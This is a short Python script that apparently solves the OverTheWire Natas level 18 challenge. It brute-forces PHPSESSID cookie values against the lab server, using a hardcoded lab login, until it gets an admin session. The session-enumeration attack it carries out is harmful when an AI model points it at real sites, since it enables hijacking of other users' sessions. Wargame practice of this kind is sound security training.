import requests
from requests.auth import HTTPBasicAuth
from bs4 import BeautifulSoup

def fun(k1,k2,k3,k4,k5,k6,k7,k8,k9,k10,k11):
    print(k1,k2,k3,k4,k5,k6,k7,k8,k9,k10,k11)

authorization = HTTPBasicAuth('natas18', 'xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP')

session = requests.Session()

payload = {'username':'admin','password':'admin','debug':'true'}

for x in range(1,641):
    cooks = {'PHPSESSID':'{}'.format(str(x))}
    response = requests.get('http://natas18.natas.labs.overthewire.org/index.php',params=payload,auth=authorization, cookies=cooks)

    print(response.text)
    print(requests.utils.dict_from_cookiejar(response.cookies))
    
    print(response.url)
    if ('You are an admin.' in response.text):
        break